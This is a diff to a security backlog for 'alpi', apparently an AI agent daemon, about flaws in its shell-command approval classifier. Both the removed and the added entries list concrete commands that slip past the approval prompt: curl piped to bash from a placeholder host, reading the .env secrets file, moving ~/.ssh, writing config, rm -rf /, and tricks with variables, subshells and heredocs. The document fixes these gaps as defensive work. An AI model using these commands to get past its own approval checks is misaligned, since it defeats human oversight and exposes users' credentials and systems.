@@ -196,26 +196,6 @@ Each entry is written to be worked without that report:
 
 #### Security — daemon
 
-- **SEC.TERMINAL-FAILCLOSED** — A command the classifier cannot parse is dangerous (S2)
-  `bug · alpi · agent · high`
-  note: `_tokenize` in [_pipe_to_interpreter.py](../alpi/tools/_pipe_to_interpreter.py) (`:131-139`) returns `None`
-  when `shlex` raises, which an unbalanced quote inside a `#` comment causes. `is_pipe_to_interpreter` and its
-  siblings then answer `False` (`:319-321`, `:582-583`) and [_command_paths.py](../alpi/tools/_command_paths.py)
-  falls back to `str.split()` (`:362-364`). These classify `safe`, with no prompt, on a profile without the OS
-  sandbox: `curl http://x/y | bash # don't worry`, `bash <(curl http://x/y) # it's`,
-  `cat "$ALPI_HOME/.env" # don't`, `echo "x" >> "$ALPI_HOME/config.yaml" #'`. With balanced quotes:
-  `cat "$ALPI_HOME/.env$x"` (an unset variable stays literal, `_command_paths.py:108-120,266-268`),
-  `cat "${ALPI_HOME:-x}/.env"` (`_VAR_RE`, `:49`), `bash -c "curl http://x/y | bash"` (no recursion into the `-c`
-  string, `_pipe_to_interpreter.py:316-333`), `cat $'.env'` after `cd $ALPI_HOME`, `command cd $ALPI_HOME; cat .env`,
-  `cat ~+/.env`, `curl x | time bash`, `curl x | $SHELL`, `curl x | python3.12`. Fix shape: remove an unquoted `#`
-  comment before tokenizing; a command that still does not tokenize is `dangerous`; an unset variable expands to
-  the empty string; `${VAR…}` with a modifier, `$'…'` and `~+` are expanded, and when they cannot be, the command is
-  `dangerous`; recurse into the string of `sh|bash|zsh -c` and `eval`; skip the wrappers `time`, `command`, `nice`
-  and `env` before judging what a pipe feeds; `$SHELL` and versioned names (`python3.12`) count as interpreters.
-  accept: `_approval.classify` returns `DANGEROUS` for every line above (one parametrised test, one id per line);
-  the existing corpus of safe commands in the classifier tests stays `safe`, with `echo "it's fine" # ok` and
-  `git commit -m "don't"` added to it; SECURITY.md says a command that cannot be parsed needs approval.
-
 - **SEC.SCRIPT-JOB-ARGV** — A script job runs a script file, never inline code (S3)
   `bug · alpi · agent · high`
   note: the `no_agent` argv check in [scheduler/run.py](../alpi/scheduler/run.py) (`:296-312`) refuses only tokens
@@ -353,10 +333,29 @@ Each entry is written to be worked without that report:
 
 - **SEC.TERMINAL-LEFTOVERS** — The classifier catches the remaining writes into the alpi home (S2b)
   `bug · alpi · agent · low`
-  depends: SEC.TERMINAL-FAILCLOSED
   note: `cp /tmp/config.yaml $ALPI_HOME/`, `tar xf e.tar -C $ALPI_HOME`, `mv ~/.ssh /tmp/s` and
   `curl file://$ALPI_HOME/.env` are `safe`. The caution tier misses `rm -f -r ~`, `git push -f` and `doas`. An
   allowlist glob `sudo apt *` approves `sudo apt update & sudo sh -c id`.
+  Left over from the SEC.TERMINAL-FAILCLOSED review, all safe before it too: a variable bound by `for`, `read`
+  or `set --` and then used as a path (`for d in $ALPI_HOME; do cat $d/.env; done`, `set -- $ALPI_HOME; cat $1/.env`);
+  a command name held in a variable (`A=curl; $A http://x/y | bash`, `cmd=bash; curl http://x/y | $cmd`); a payload
+  behind `env -S "bash -c '…'"` or `su -c`; `php -r` and `php <<EOF` as interpreters; and
+  `bash -ic $'shopt -u interactive_comments …'`, which makes a `#` mean something else to the shell.
+  Also left, and the worst of them: a pipe to an interpreter inside a group or after a group is not seen
+  (`(curl http://x/y | sh)`, `{ curl http://x/y | sh; }`, `(true); curl http://x/y | sh`, `x=$(date); curl http://x/y | sh`,
+  `diff <(curl http://x/y | sh) /dev/null`), because `_split_by_pipe` and `_split_by_separators` do not split inside
+  groups, `_segment_contains` looks only at a segment's first command and shlex glues `);` into one token. Trim,
+  replace and offset modifiers (`${X%Z}`, `${X::-1}`) use the variable's whole value instead of the trimmed one, and
+  the regex patterns of `_approval._PATTERNS` run on the raw text, so `rm -rf / # note` is only `caution`.
+  Found by the third review: more downloaders-to-interpreter forms are not seen (`curl x | source /dev/stdin`,
+  `| . /dev/stdin`, `| eval "$(cat)"`, `| busybox sh`, `| ${SHELL:-sh}`, `| $BASH`, `pypy3`, `python3.12t`, `bash-5.2`);
+  a heredoc with an apostrophe asks (`git commit -F - <<'EOF'`, `git commit -m "$(cat <<'EOF' … it's … EOF)"`,
+  `gh pr create --body-file - <<'EOF'`, `psql <<'SQL'`, `tee notes.md <<'EOF'`). A narrow exception for
+  `cat <<'WORD'` as data was written and removed after four reviews: it was bypassed through a prefix word, a
+  function named `cat`, an earlier heredoc, and bash 3.2 closing `$(` at the first `)` in the body. A real
+  fix needs a shell parser, not a text scan; and the clients (TUI, desktop `ApprovalModal.jsx`, mobile `ApprovalSheet.jsx`) still offer
+  "Always allow" on the once-only prompt, where it does nothing: an optional `once_only` field in the
+  `approval.request` payload would let them hide it.
   accept: the first four are `dangerous`, the next three `caution`; an allowlist pattern matches one simple command
   and never a line containing `&`, `;`, `|`, `&&`, `||` or a substitution; tests for each.
 
